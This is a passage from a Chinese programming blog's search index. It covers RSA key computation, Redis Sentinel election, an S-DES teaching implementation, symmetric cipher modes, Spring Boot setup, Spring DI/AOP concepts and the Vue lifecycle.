== 0: return (euler * k + 1) // e k += 1# 根据n,e计算d(或根据n,d计算e)def get_rsa_e_d(n, e=None, d=None): if e is None and d is None: return arg = e if arg is None: arg = d primes = rsa_moder(n) p = primes[0] q = primes[1] d = rsa_get_key(arg, rsa_get_euler(p, q)) return ddef test(): str_fmt = &apos;n: {:&lt;10} e: {:&lt;10} d: {:&lt;10}&apos; # 导入rsa库 import rsa as rsa key = rsa.newkeys(24) # 产生rsa密钥对 if isinstance(key[1], rsa.PrivateKey): print(str_fmt.format(key[1].n, key[1].e, key[1].d)) # 解密 n = 14666299 d = 2101153 e = get_rsa_e_d(n, None, d) print(str_fmt.format(n, e, d)) n = 12748507 e = 65537 d = get_rsa_e_d(n, e, None) print(str_fmt.format(n, e, d))if __name__ == &apos;__main__&apos;: test()","link":"2018/12/31/RSA%E8%AF%81%E6%98%8E/"},{"title":"Redis哨兵核心选举算法-通过开车理解quorum和majority的意义","text":"楔子：刚好在整Redis缓存高可用，阿汤哥的一句话Redis哨兵集群只有2个节点无法正常工作把俺给说晕了，网上也没找到比较通俗易懂的文章,所以自己理解了一下哨兵选举算法，为啥两个结点就是一个死局？。才疏学浅有错误的地方还望指出，多多包涵一、类比开车举报算法1.1、假如kitty萌新来到了一个不允许开车的世界,人们互相监督其他人是不是在开车，最开始大家都没有证据 假如一旦确认为了周某开车了，并且有了证据，那么我们将对这个老司机判刑，但是还是需要人民在法院投票确定是否周某犯了开车罪，所有人民同时拥有举报和投票的权利，但是如果你被举报，你将剥夺投票自己是否入刑的权利（总不能说我认为我没开车嘛 当然，我们假设这个世界只要有人民指出一个人在开车我们就可以说有证据了，就可以交往法院裁决，由人民投票，假如这个世界有n个人.那么问题来了，多少个人举报才算有证据，多少人投票同意判刑周某才能入狱于是这个世界的老大在《不允许开车法》中写入一下几条（首先给出一些定义，n表示世界总人数，quorum代表举报周某开车的人数，majority代表大多数人-可以理解为这个值代表了大多数人民的选择-在n确定的时候为定值） 1、首先quorum一定要大于等于12、如果quorum&lt;majority，那么法院投票同意入刑的人要多于majority才能入刑3、如果quorum&gt;=majority, 那么需要法院投票同意入刑的人要多于quorum才能入刑4、majority取值如下:n= 2，majority=2n= 3，majority=2n= 4，majority=2n= 5，majority=3...... 我们来讨论一下这三条1、第一条肯定是没问题的，必须要有人举报才能送温暖嘛2、第二条意思就是如果是少数人举报周某开车，那么需要大多数人投票入刑才能生效、3、第三条就是如果举报的人数已经多与了国家的majority都认为周某开车，那么仅仅是majority投票法院是不够的，可能是因为入刑生效是严肃的，具体细节去问那个世界的扛把子4、这个算法其实类似于(n+1)/2向下取整,但是除了2个人的时候，法律就是法律吧。 1.2、所以现在模拟两个场景场景1、这个世界只有两个人，A举报B开车是否有效分析： 这个环境中n=2,majority=2,quorum=1（世界人数2，根据法律majority人数为2，只有A一个人举报了B所以quorum=1 因为quorum&gt;0,所以举报生效 根据规则quorum&lt;majority,所以需要majority（2）个人投票有罪 但是现在只有A一个人拥有投票权限，所以无效 场景2、假如这个世界有三个人，A,B,C中有人举报了C开车,并且A,B都愿意将C投票入狱分析1：假如A,B中有一个人举报了C 这个环境中n=3,majority=2,quorum=1（世界人数2，根据法律majority人数为2，有一个人举报了C所以quorum=1 因为quorum&gt;0,所以举报生效 根据规则quorum&lt;majority,所以需要majority（2）个人投票有罪 现在有A，B两个个人拥有投票权限，所以投票有效 分析2：假如A,B中两个人都举报了C 这个环境中n=3,majority=2,quorum=2（世界人数2，根据法律majority人数为2，两个人都举报了C所以quorum=1 因为quorum&gt;0,所以举报生效 根据规则quorum&gt;=majority,所以需要quorum（2）个人投票有罪 现在有A，B两个个人拥有投票权限，所以投票有效 （以上则是经典的Redis三节点哨兵集群二、Redis哨兵核心选举算法分析（严肃脸这个需要先了解Redis主从架构，如果您还不熟悉，可以先移步Redis主从架构以及vm-centOS-7-minimal版本网络配置小记 2.1、哨兵的主要功能如下（1）集群监控，负责监控redis master和slave进程是否正常工作（2）消息通知，如果某个redis实例有故障，那么哨兵负责发送消息作为报警通知给管理员（3）故障转移，如果master node挂掉了，会自动转移到slave node上（4）配置中心，如果故障转移发生了，通知client客户端新的master地址 2.2、Redis哨兵核心知识（1）哨兵至少需要3个实例，来保证自己的健壮性 （2）哨兵 + redis主从的部署架构，是不会保证数据零丢失的，只能保证redis集群的高可用性 （3）对于哨兵 + redis主从这种复杂的部署架构，尽量在测试环境和生产环境，都进行充足的测试和演练 2、3：sdown和odown两种宕机sdown和odown两种失败状态 sdown是主观宕机，就一个哨兵如果自己觉得一个master宕机了，那么就是主观宕机 。 odown是客观宕机，如果quorum数量的哨兵都觉得一个master宕机了，那么就是客观宕机 。sdown达成的条件很简单，如果一个哨兵ping一个master，超过了is-master-down-after-milliseconds指定的毫秒数之后，就主观认为master宕机 。 sdown到odown转换的条件很简单，如果一个哨兵在指定时间内，收到了quorum指定数量的其他哨兵也认为那个master是sdown了，那么就认为是odown了，客观认为master宕机 。 在这里宕机可以类比于上面的开车了 2.4、quorum和majority算法中的核心参数，如果看了上面的类比就很容易理解，quorum表示认为某机子宕机的哨兵数量（举报开车的人数），majority表示授权进行主从切换的最少的哨兵数量（最少投票入刑的人数） 。 2.5、主备切换工作1、首先至少一个哨兵认为某机宕机了2、如果quorum &lt; majority，那么最少majority个哨兵授权就可以执行切换3、如果quorum &gt;= majority，那么必须quorum数量的哨兵都授权才能执行切换4、majority取值如下:n= 2，majority=2n= 3，majority=2n= 4，majority=2n= 5，majority=3你会发现这个规则和上面的开车判断一模一样 问题回答阿汤哥：为什么Redis哨兵集群只有2个节点无法正常工作？和场景1一模一样，A哨兵，举报了B机 这个环境中n=2,majority=2,quorum=1（2机子，根据规定majority为2，只有A举报了B所以quorum=1 因为quorum&gt;0,所以举报生效 根据规则quorum&lt;majority,所以需要majority（2）授权 但是现在只有A台机拥有授权权限，所以无效 那么为什么三台以上就行呢，自己看场景2吧。 ps:从Redis经典三节点哨兵集群看得出来，最少3个人才拥有维持规矩的基础，如果最后只剩下2个人，那么规则系统必定崩塌","link":"2019/07/13/Redis%E5%93%A8%E5%85%B5%E6%A0%B8%E5%BF%83%E9%80%89%E4%B8%BE%E7%AE%97%E6%B3%95-%E9%80%9A%E8%BF%87%E5%BC%80%E8%BD%A6%E7%90%86%E8%A7%A3quorum%E5%92%8Cmajority%E7%9A%84%E6%84%8F%E4%B9%89/"},{"title":"S-DES详解","text":"一、S-DES介绍S-DES是DES算法的简化版,并没有什么实际使用的价值,只用于教学来理解DES算法的加密方法,那么可能就有小朋友会问了，为什么不是直接讲DES呢,Orz对于非信安的萌新来说,DES确实难,所以先看一下简洁版的S-DES的算法先预热预热。 二、整体加密流程 看起来很可怕，其实就是三个部分，一个是左边的加密算法，一个中间的密钥生成算法，一个右边的解密算法按常理，先罗列一下所需要的前提条件 1 &gt;数学知识储备1.置换离散上有的，切确来说就是，比如p8{8,2,6,4,1,7,5,3},就是转换下标顺序，比如输入ABCDEFGH,经过p8,得到的HBFDAGEC 2.循环比较好理解，就是左移右移，溢出的位循环补齐，比如ABCD,左移一位就是BCDA 3.如何选S盒中的值S盒就相当于一个二位数组，作用是输入一个4 bit的二进制流，输出一个2bit的二进制流规则：当输入ABCD,则选择（AD，BC)为坐标，比如下方的S盒 S0:{1,0,3,2},{3,2,1,0},{0,2,1,3},{3,1,3,2}, 当输入0101时候，(AD,BC)= （01,10）=（1，2）=1=01 所以输出01，数组横纵坐标都是0~3 2&gt;一些变量P10 {3,5,2,7,4,10,1,9,8,6}P8 {6,3,7,4,8,5,10,9} 注意这个置换选择输入10位输出8位P4 {2,4,3,1}IP {2,6,3,1,4,8,5,7}IPI {4,1,3,5,7,2,8,6}EP {4,1,2,3,2,3,4,1} 注意这个是扩展置换,输入4位输出8位两个盒子S0:{1,0,3,2},{3,2,1,0},{0,2,1,3},{3,1,3,2},S1:{0,1,2,3},{2,0,1,3},{3,0,1,0},{2,1,0,3}, 3&gt;简单的实现None的作用是占据下标为0的数组值 def P10(key): k = [None] + key return [k[3],k[5],k[2],k[7],k[4],k[10],k[1],k[9],k[8],k[6]]def P8(key): k = [None] + key return [k[6],k[3],k[7],k[4],k[8],k[5],k[10],k[9]]def Shift(value): return value[1:] + value[0:1] 三、密钥生成单独把密钥生成拿出来考虑的话，其实就是输入一个10bit的二进制，得到一个8bit的K1,一个8Bit的K2假设我们的10位密钥 key=01111 11101 1、p10置换得到11111 10011 ,(p10表在上面有 2、记左半的为LK=11111,右半为RK=10011 3、LK,RK循环左移一位，得到LK=11111,RK=00111 4、LK,RK重组为11111 00111 做p8置换，得到K1=0101 1111 5、抛弃第四条，把LK,RK再次循环左移两位得到LK=11111,RK=11100 6、LK,PK重组得到11111 11100,做p8置换得到K2=1111 1100 到此位置密钥生成的算法我们就了解了 四、加密流程 函数解释1.IP与IP-1其实IP就是一个8bit到8bit的置换，IP-1是他的逆，（离散真香实现就是 def IP(value): v = [None] + value return [k[2],k[6],k[3],k[1],k[4],k[8],k[5],k[7]]def IPinv(value): v = [None] + value return [k[4],k[1],k[3],k[5],k[7],k[2],k[8],k[6]] 2.SW函数在大图中有一个SW的函数，在小图中因为更详细就没有，其实意思就是高四位和第四位互换 def SW(value): return value[4:] + value[:4] 3.剩下最后一个F函数到目前为止，只剩下一个问题，就是F函数(大图的Fk函数)，我们先看F函数的功能参数和返回值参数：一个8bit的子密钥K1,一个4Bit的L0,一个4Bit的R0返回值：4bit的新R1假如K1为0101 1111,左半(高位)为L0=0100,右半(低位)为R0=1001 1.对R0做EP扩展（4,1,2,3,2,3,4,1）置换,得Rm’=1100 0011 2.Rm’与子密钥K1按位异或,得Rm’= 1001 1100 3.Rm’左半1001进入S0盒替代选择得S0(11,00)=S0(3,1)=11,右半1100进入S1盒替代选择的S1(10,10)=S1(2,2)=01,所以的到了Rm’=1101 4.对Rm’做P4（2,4,3,1）置换,得Rm’=1101 5.Rm’与L0按位异或,得L0’=1001 6.L0’与最开始的R0组合得到1001(L0’) 1001(R0) 7.然后交换高低位,1001(R0) 1001(L0’)作为输入第二轮的输入即：L1=1001，R1=1001 到此第一轮循环完全结束，第二次也类似，第二轮结束的组合通过IP-1就算加密结束 五、简单的S-DES加密python实现 import stringplaintext = &quot;11101010&quot;K = &quot;0111111101&quot;rounds = 2alphabet = string.ascii_uppercasedef bin_to_ascii_4bit(bin_string): h1, h2 = split_half(bin_string) return alphabet[bin_to_int(h1)] + alphabet[bin_to_int(h2)]def P10(data): box = [3, 5, 2, 7, 4, 10, 1, 9, 8, 6] return &quot;&quot;.join(list(map(lambda x: data[x - 1], box)))def P8(data): box = [6, 3, 7, 4, 8, 5, 10, 9] return &quot;&quot;.join(list(map(lambda x: data[x - 1], box)))def P4(data): box = [2, 4, 3, 1] return &quot;&quot;.join(list(map(lambda x: data[x - 1], box)))def S0(data): row = bin_to_int(data[0] + data[3]) col = bin_to_int(data[1] + data[2]) box = [ [&quot;01&quot;, &quot;00&quot; ,&quot;11&quot;, &quot;10&quot;], [&quot;11&quot;, &quot;10&quot;, &quot;01&quot;, &quot;00&quot;], [&quot;00&quot;, &quot;10&quot;, &quot;01&quot;, &quot;11&quot;], [&quot;11&quot;, &quot;01&quot;, &quot;11&quot;, &quot;10&quot;] ] return box[row][col]def S1(data): row = bin_to_int(data[0] + data[3]) col = bin_to_int(data[1] + data[2]) box = [ [&quot;00&quot;, &quot;01&quot;, &quot;10&quot;, &quot;11&quot;], [&quot;10&quot;, &quot;00&quot;, &quot;01&quot;, &quot;11&quot;], [&quot;11&quot;, &quot;00&quot;, &quot;01&quot;, &quot;00&quot;], [&quot;10&quot;, &quot;01&quot;, &quot;00&quot;, &quot;11&quot;] ] return box[row][col]def IP(data): box = [2, 6, 3, 1, 4, 8, 5, 7] return &quot;&quot;.join(list(map(lambda x: data[x - 1], box)))def IP_1(data): box = [4, 1, 3, 5, 7, 2, 8, 6] return &quot;&quot;.join(list(map(lambda x: data[x - 1], box)))def E_P(data): box = [4, 1, 2, 3, 2, 3, 4, 1] return &quot;&quot;.join(list(map(lambda x: data[x - 1], box)))def XOR(data, key): return &quot;&quot;.join(list(map(lambda x, y: str(int(x) ^ int(y)), data, key)))def LS(data, amount): return data[amount:] + data[:amount]def SW(data): data1, data2 = split_half(data) return data2 + data1 def split_half(data): return data[:int(len(data) / 2)], data[int(len(data) / 2):]def int_to_bin(data): return &quot;{0:b}&quot;.format(data)def bin_to_int(data): return int(data, 2)def generate_round_keys(key, rounds): round_keys = [] k_h1, k_h2 = split_half(P10(key)) s = 0 for i in range(1, rounds + 1): s += i h1, h2 = LS(k_h1, s), LS(k_h2, s) round_keys.append(P8(h1 + h2)) return round_keysdef encrypt(data, key): round_keys = generate_round_keys(key, rounds) ip1, ip2 = split_half(IP(data)) print(&quot;IP: {}&quot;.format(ip1 + ip2)) for i, r_key in enumerate(round_keys): data = E_P(ip2) data = XOR(data, r_key) d1, d2 = split_half(data) d1 = S0(d1) d2 = S1(d2) data = XOR(ip1, P4(d1 + d2)) + ip2 if i == 0: print(&quot;First Fk: {}&quot;.format(data)) elif i == 1: print(&quot;Second Fk: {}&quot;.format(data)) if i != len(round_keys) - 1: ip1, ip2 = split_half(SW(data)) print(&quot;SW: {}&quot;.format(ip1 + ip2)) else: ciphertext = IP_1(data) print(&quot;IP-1: {}&quot;.format(ciphertext)) return ciphertextdef decrypt(data, key, comments=False): round_keys = list(reversed(generate_round_keys(key, rounds))) ip1, ip2 = split_half(IP(data)) if comments: print(&quot;IP: {}&quot;.format(ip1 + ip2)) for i, r_key in enumerate(round_keys): data = E_P(ip2) data = XOR(data, r_key) d1, d2 = split_half(data) d1 = S0(d1) d2 = S1(d2) data = XOR(ip1, P4(d1 + d2)) + ip2 if comments and i == 0: print(&quot;First Fk: {}&quot;.format(data)) elif comments and i == 1: print(&quot;Second Fk: {}&quot;.format(data)) if i != len(round_keys) - 1: ip1, ip2 = split_half(SW(data)) if comments: print(&quot;SW: {}&quot;.format(ip1 + ip2)) else: plaintext = IP_1(data) if comments: print(&quot;IP-1: {}&quot;.format(plaintext)) return plaintextif __name__ == &quot;__main__&quot;: print(&quot;需要加密的明文为: {} ({})&quot;.format(plaintext, bin_to_ascii_4bit(plaintext))) print(&quot;Key: {}&quot;.format(K)) print(&quot;\\n以下是加密的过程\\n-------------------\\n&quot;) C= encrypt(plaintext,K) print(&quot;加密后的密文为: {} ({})&quot;.format(C, bin_to_ascii_4bit(C))) print(&quot;\\n以下是解密的过程\\n-------------------\\n&quot;) d = decrypt(C, K, comments=True) print(&quot;解密后的明文是: {} ({})&quot;.format(d, bin_to_ascii_4bit(d)))","link":"2019/08/16/S-DES%E8%AF%A6%E8%A7%A3/"},{"title":"Some Tricks Of Symmetric Cryptography","text":"Symmetric Cryptography means this encryption algorithm use the same key for encryption and decryption. Although I am a web dog, encryption algorithm in some web question recently let me broken heart. 1. Some Symmetric Encryption Algorithm 2. Symmetric Cryptography in CTF-WEB 3. Some Encryption mode 3.1. Electronic Codebook Book (ECB) 3.2. Cipher Block Chaining (CBC) 1. Some Symmetric Encryption AlgorithmDES、3DES、TDEA、Blowfish、RC2、RC4、RC5、IDEA、SKIPJACK Here is another blog for S-DES which i wrote before. 2. Symmetric Cryptography in CTF-WEBhere are some crypto in ctf.which i know most is Padding Oracle or Cbc Flipped Ciphertext Bits.for example CBC in NJCTF or shiyanba easy login question and so on . some i want introduce some Padding Oracle Tricks in ctf_web. 3. Some Encryption modeSymmetric encryption has two types of encryption modes, namely block encryption and stream encryption.but in AES algorithm has five modes.if you want to find a aes decrypto/encrypto online mabey you need choice which mode you want use.for example Electronic Codebook Book (ECB)Cipher Block Chaining (CBC)Counter (CTR)Cipher FeedBack (CFB)Output FeedBack (OFB) 3.1. Electronic Codebook Book (ECB)ECB is the simplest mode is encryption modes.As we can see,we just need block the plaintext.Encryto every piece,than split joint every ciphertext.this is ECB encryption mode. 3.2. Cipher Block Chaining (CBC)In this mode, the plaintext is first divided into several segments, and then each segment is XOR with the initial block(first segments) or the ciphertext segment of the previous segment, and then encrypted with the key.Explain this encryption flow chart:• Ciphertext-0 = Encrypt(Plaintext XOR IV)—for first plaintext segment• Ciphertext-N= Encrypt(Plaintext XOR Ciphertext-N-1)—othere plaintext segmentsDecyption as same.• Plaintext-0 = Decrypt(Ciphertext XOR IV) —for first ciphertext segment•Plaintext-N= Decrypt(Ciphertext XOR Ciphertext-N-1)—othere ciphertext segments","link":"2020/12/01/Some-Tricks-Of-Symmetric-Cryptography/"},{"title":"Spring Boot环境搭建","text":"人终究没有自己想象的那么厉害，之前有过spring的基础，现在仅仅是回忆Spring的配置问题以及转向spring boot,从昨晚肝到此刻（Orz只能拿时间来弥补自己的天赋不足），又一次见到了5点钟的南航，任何火热技术的发展都是能够为了解决人类当前的一个痛点，Spring和Spring MVC的配置问题应该是Spring最大的门槛或者说败笔，而Spring boot完美的解决了这一问题，甚至帮你把汤姆猫（Tomcat）封装进去了，一晚上大概学了点Maven 配置，Spring boot的参数请求，整合swagger,路由设定等，虽然说写博客挺花时间的，而且还是没有水平的，但是还是想记一下博客，主要是以便于之后的自己回忆快一些 一、SpringBoot2.0环境准备jdk1.8+；java version “1.8.0_112”A favorite text editor or IDE：IntelliJ IDEA 2018.2.6 二、Maven配置Maven的核心功能便是合理叙述项目间的依赖关系，通俗点讲，就是通过XXXX.xml这样的文件的配置获取jar包，而不用手动去添加jar包，就好比前端开发的package.jsonIDEA内部自带一Maven2，一个Maven3，我们当然用的是Maven3，当初学spring mvc的时候，环境真要折腾死了，主要是当初自己不敢尝试，害怕失败后重装的折腾，但是这玩意折腾折腾几次才真的会了，所以自然要配置国内maven仓库镜像IDEA的Maven文件目录为：{你IDEA软件安装目录}、IDEA\\IntelliJ IDEA 2018.3.1\\plugins\\maven\\lib\\maven3\\conf这个里面有一个setting.xml,在mirrors标签的子标签&lt;mirror&gt;中的代码改为： &lt;mirror&gt; &lt;id&gt;alimaven&lt;/id&gt; &lt;name&gt;aliyun maven&lt;/name&gt; &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public/&lt;/url&gt; &lt;mirrorOf&gt;central&lt;/mirrorOf&gt; &lt;/mirror&gt; 其实很简单对不对 三、新建一个项目 新建Spring Initializr 项目，如图： 填写项目信息，如图： 选择项目使用的技术，如图： 填写项目名称：如图： 项目架构及依赖，如图： 添加测试控制器。直接在入口类中编写。package com.springboot.first;import org.springframework.boot.SpringApplication;import org.springframework.boot.autoconfigure.SpringBootApplication;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController;@RestController@SpringBootApplicationpublic class FirstApplication { @RequestMapping(&quot;/&quot;) String index() { return &quot;Hello Spring Boot&quot;; } public static void main(String[] args) { SpringApplication.run(FirstApplication.class, args); }} 运行项目，把它当成一个java类运行就可以了，右键菜单中选择，如图：运行信息： 访问localhost:8080即可四、时区设置jdbc:mysql://XXXX:3306/xxxx?characterEncoding=utf8&amp;useLegacyDatetimeCode=false&amp;serverTimezone=UTC","link":"2019/02/26/Spring-Boot%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"title":"Spring三大思想","text":"一、DI(依赖注入)和IOC(控制反转)Spring的三大思想为DI(依赖注入)，IOC(控制反转)，AOP（面向切面编程）。既然在学Spring就认真学一些思想，而不是仅仅停留在复制粘贴CURD的层面，这也许就是码农的自我修养吧。 1.1、万物初始既然大家都没有女朋友，那今天书鱼教教大家怎么找女朋友吧。假如你有了一个女朋友，，，，类 public class GirlFriend{ String name; //有名字 Face face; Head head; //有头有脸的意思 ....... //其他一堆优点 GirlFriend(String name) { this.name=name; } } 那么现在你是一个成功人士，即将走上人生巅峰，是不是还有一 点小激动呢 public class Person{ Person(){ //给你女朋友加属性 GirlFriend girlFriend=new GirlFriend(&quot;迪丽热巴&quot;); Car car=new Car(&quot;兰博基尼&quot;); House house=new House(&quot;海景套房&quot;); //有车有房 } } 现在你要出生啦啦啦 Person you;//当你需要你女朋友的时候你可以这样you.girlFriend;//比如当别人问你女朋友谁啊，你可以回答printf(&quot;%s&quot;,you.girlFriend.name); 直到一天，你和你女朋友的缘分尽了，经历一段痛心肺腑的分手诀别后，你找到了新的女朋友雏田小姐姐，当然这个时候将会有数百句渣男，臭鸡蛋扑面而来，但是，嘻嘻，你还是要更新你女朋友的名字。那么你要怎么做呢？你要把Person类里GirlFriend的构造参数改一下 GirlFriend girlFriend=new GirlFriend(&quot;日向雏田&quot;); 这个时候你会发现你是全世界最成功的人士，但是等等你可能忽略了一个问题，因为你换女朋友，你自己的类改变了(person类改变了)，你不再是那个打娘胎里出来的那个单纯的Person,而是人工改造后的你，这样的你是没有灵魂的，这是因为，你依赖于你女盆友（Person类依赖于GirlFriend）,这样你和你女朋友的耦合性太强了（Person类和GirlFriend耦合性强），那么依赖注入就是为了解决一下这个问题。 1.2、控制反转和依赖注入（正经脸）以下来自百度百科 控制反转（Inversion of Control，缩写为IoC），是面向对象编程中的一种设计原则，可以用来减低计算机代码之间的耦合度。其中最常见的方式叫做依赖注入（Dependency Injection，简称DI。通过控制反转，对象在被创建的时候，由一个调控系统内所有对象的外界实体，将其所依赖的对象的引用传递给它。也可以说，依赖被注入到对象中。 是不是很晕，听不懂，如果你懂了，请直接跳过本博客，如果没看懂，请继续听我吹逼。其实意思还是很简单的，就是为了解除Person和GirlFriend的耦合，在修改GirlFriend.name的同时不修改Person类，能不能做到呢，答案是肯定的 class Person{ GirlFriend girlFriend; Person(GirlFriend girlFriend){ this.girlFriend = girlFriend;}; .........} 这样就算你要天天换女朋友，又能保持自己的灵魂，你只要 GirlFriend girlFriend=new GirlFriend(&quot;日向雏田&quot;);Person you= new Person(girlFriend); 字面意思就是将你女朋友注入到你中（为什么听起来优点别扭），这是通过构造函数依赖注入,而依赖注入有3种方式分别为构造方法注入，setter注入，基于注解的注入。思想和构造方法注入是一致的，比如setter函数注入：其实也就是在Person中另外写一个函数来替代构造函数，然后在new person够调用这个函数。 class Person{ GirlFriend girlFriend; SetGirlFriend(GirlFriend girlFriend){ this.girlFriend = girlFriend;};}Person you=new Person();GirlFriend girlFriend=new GirlFriend(&quot;日向雏田&quot;);you.SetGirlFriend(girlFriend) 基于注解的注入：注解我看来就是为了加快人生进步发展（为了让后人偷懒），而定义的一些约定注释，提高我们的编程体验。看一看spring有哪些关于注入的注解 @Component注解：表明当前类为一个组件（bean） @Value注解：为bean注入值 @Autowired注解 ：为bean注入其他bean（byType方式） @Qualifier注解：与Autowired注解联用实现byName方式注入 @Resource注解：这个不是Spring提供的注解，这个是jdk提供的注解，要求jdk版本1.6以上，这个注解可以实现Autowired和Resource的功能。当直接注解@Resource时起到Autowired功能（byType），当加上参数@Resource（name=”“）的时候，起到@Autowired和@Qualifier联合使用的功能（byName） 当你能看到这里的时候，自然就会去学习注解的详细使用，这里只唠唠思维，就不展开。 控制反转名字由来：对象A获得依赖对象B的过程,由主动行为变为了被动行为，控制权颠倒过来了，这就是“控制反转”这个名称的由来，其实就是通过IoC容器来关联这些对象类。这样对象与对象之间就通过IoC容器进行联系，但对象与对象之间并没有什么直接联系。在上面例子中，就是可以新建一个工厂类，专门生产女朋友的，然后你要什么女朋友通过调用女朋友工厂生产后再注入。 二、AOP（面向切面编程）先来一个官方书面表述：AOP（Aspect Oriented Programming）意为：面向切面编程，通过预编译方式和运行期动态代理实现程序功能的统一维护的一种技术。AOP是OOP的延续，是软件开发中的一个热点，也是Spring框架中的一个重要内容（Spring核心之一），是函数式编程的一种衍生范型。利用AOP可以对业务逻辑的各个部分进行隔离，从而使得业务逻辑各部分之间的耦合度降低，提高程序的可重用性，同时提高了开发的效率。（反正我第一遍是看不懂的） 2.1、面向切面是面向啥玩意：我们先抛开Spring对于AOP的事件机制，单纯说一说面向切面编程，切面其实就是一些切面性问题的受力点，也叫横切性问题即和主业务逻辑无关，散落四方的一些方法。比如日志记录，效率检查，时间记录等等。比如再次回到女朋友问题，假如一位情场高手打算出一本泡妞宝典，所以打算在每个女朋友追求到手后记录下经验，然后写入宝典，现在需求就是在确认关系上添加记录经验,所以现在是这样的： 认识女朋友1—&gt;相遇—&gt;追求—&gt;确认关系—&gt;分手认识女朋友2—&gt;相遇—&gt;追求—&gt;确认关系—&gt;分手认识女朋友3—&gt;相遇—&gt;追求—&gt;确认关系—&gt;分手认识女朋友4—&gt;相遇—&gt;追求—&gt;确认关系—&gt;分手                ||               |总结经验| 再回到AOP编程思想中，由于总结经验对于每一场恋爱的主线没有直接关系，最多是人品问题（天地良心，我个人不是这样水性杨花的），所以可以把确认关系当一个切面，而横切的问题就是总结经验。在编程上，如果每个业务的横切问题单独编程就会产生大量的垃圾代码，所以采用AOP能够在编程上可以大大减少你的时间 2.2、Spring的AOP具体概念（比较硬核）这里还是先给出一个比较专业的概念定义： Aspect（切面）： Aspect 声明类似于 Java 中的类声明，在 Aspect 中会包含着一些 Pointcut 以及相应的 Advice。 Joint point（连接点）：表示在程序中明确定义的点，典型的包括方法调用，对类成员的访问以及异常处理程序块的执行等等，它自身还可以嵌套其它 joint point。 Pointcut（切点）：表示一组 joint point，这些 joint point 或是通过逻辑关系组合起来，或是通过通配、正则表达式等方式集中起来，它定义了相应的 Advice 将要发生的地方。 Advice（增强）：Advice 定义了在 Pointcut 里面定义的程序点具体要做的操作，它通过 before、after 和 around 来区别是在每个 joint point 之前、之后还是代替执行的代码。 Target（目标对象）：织入 Advice 的目标对象.。Weaving（织入）：将 Aspect 和其他对象连接起来, 并创建 Adviced object 的过程 （放弃吧，光看是看不懂的，去撸代码吧）本文只想通过简单的例子讲讲思想，具体代码就不涉及了，感兴趣可以另学，另外本文旨在于学习，本人从未参与里面任何事件逻辑，感谢迪丽热巴和雏田小姐姐的友情赞助照片。","link":"2019/02/27/Spring%E4%B8%89%E5%A4%A7%E6%80%9D%E6%83%B3/"},{"title":"Vue的生命周期以及迎接新的学期","text":"唠唠嗑：寒假快结束了，完犊子了，发现自己学的东西越来越杂，嘤嘤嘤，这几天又在纠结是否要真的只专研一个方向，这个问题确实头疼让我失眠了好久，在和耗子哥哥开房♂后自己茅舍顿开（orz感谢一路上帮助过自己的所有人），在有广度的基础上，某个领域能学多深就看自己的学习能力了，广度也是重要的，但是我相信，只要天天在学，付出的努力一定是有回报的，大二下的话打算继续学习一些主流的知识，然后能找到一个真真切切适合自己的方向，迎接大三。前几天认真学习了django框架，但是自己一直对前端框架不了解，但是我觉得最起码了解一个前端框架只是一种生存本领，比如游泳，赛跑什么的，趁自己还年轻，多学点总没错的,等vue成熟就能自己django+vue前后端分离为所欲为了。 一、什么是生命周期Vue官网介绍是这样的：从Vue实例创建、运行、到销毁期间，总是伴随着各种各样的事件，这些事件，统称为生命周期！通俗说就是Vue实例从创建到销毁的过程，就是生命周期。个人觉得和C++构造函数析构函数有些类似，Vue的生命周期种主要围绕的是内存和渲染的页面,当一个玩意在内存种，你通过Consle的某些函数是能拿到的，但是通过页面上的DOM操作是拿不到的。 二、Vue生命周期详解嘚说明一下，vue生命周期的介绍是针对于有vue基础的，如果你对vue一无所知，请先去官网看文档把，Vue实例有一个完整的生命周期，也就是从开始创建、初始化数据、编译模板、挂载Dom、渲染→更新→渲染、销毁等一系列过程，我们称这是Vue的生命周期。先请客官欣赏一张叼图(个人觉得这张图确实叼炸了) 2.1、主要的生命周期函数分类： 创建期间的生命周期函数： beforeCreate：实例刚在内存中被创建出来，此时，还没有初始化好 data 和 methods 属性 created：实例已经在内存中创建OK，此时 data 和 methods 已经创建OK，此时还没有开始 编译模板 beforeMount：此时已经完成了模板的编译，但是还没有挂载到页面中 mounted：此时，已经将编译好的模板，挂载到了页面指定的容器中显示 运行期间的生命周期函数： beforeUpdate：状态更新之前执行此函数， 此时 data 中的状态值是最新的，但是界面上显示的 数据还是旧的，因为此时还没有开始重新渲染DOM节点 updated：实例更新完毕之后调用此函数，此时 data 中的状态值 和 界面上显示的数据，都已经完成了更新，界面已经被重新渲染好了！ 销毁期间的生命周期函数： beforeDestroy：实例销毁之前调用。在这一步，实例仍然完全可用。 destroyed：Vue 实例销毁后调用。调用后，Vue 实例指示的所有东西都会解绑定，所有的事件监听器会被移除，所有的子实例也会被销毁。 三、通过代码验证感觉编程这玩意，学习初期就是对着文档啊教程啊，能跑出来一样的结果，比如输出helloworld,噢你就学会了如何输出了。所以新建一个简单的例子，学习速度会快一些，这里贴一个核心代码，可以试着一个个函数来玩界面 &lt;div id=&quot;app&quot;&gt; &lt;input type=&quot;button&quot; value=&quot;修改msg&quot; @click=&quot;msg=&apos;No&apos;&quot;&gt; &lt;h3 id=&quot;h3&quot;&gt;{{ msg }}&lt;/h3&gt;&lt;/div&gt; 实例 &lt;script&gt; // 创建 Vue 实例，得到 ViewModel var vm = new Vue({ el: &apos;#app&apos;, data: { msg: &apos;ok&apos; }, methods: { show() { console.log(&apos;执行了show方法&apos;) } }, beforeCreate() { // 这是我们遇到的第一个生命周期函数，表示实例完全被创建出来之前，会执行它 // console.log(this.msg) // this.show() // 注意： 在 beforeCreate 生命周期函数执行的时候，data 和 methods 中的 数据都还没有没初始化 }, created() { // 这是遇到的第二个生命周期函数 // console.log(this.msg) // this.show() // 在 created 中，data 和 methods 都已经被初始化好了！ // 如果要调用 methods 中的方法，或者操作 data 中的数据，最早，只能在 created 中操作 }, beforeMount() { // 这是遇到的第3个生命周期函数，表示 模板已经在内存中编辑完成了，但是尚未把 模板渲染到 页面中 // console.log(document.getElementById(&apos;h3&apos;).innerText) // 在 beforeMount 执行的时候，页面中的元素，还没有被真正替换过来，只是之前写的一些模板字符串 }, mounted() { // 这是遇到的第4个生命周期函数，表示，内存中的模板，已经真实的挂载到了页面中，用户已经可以看到渲染好的页面了 // 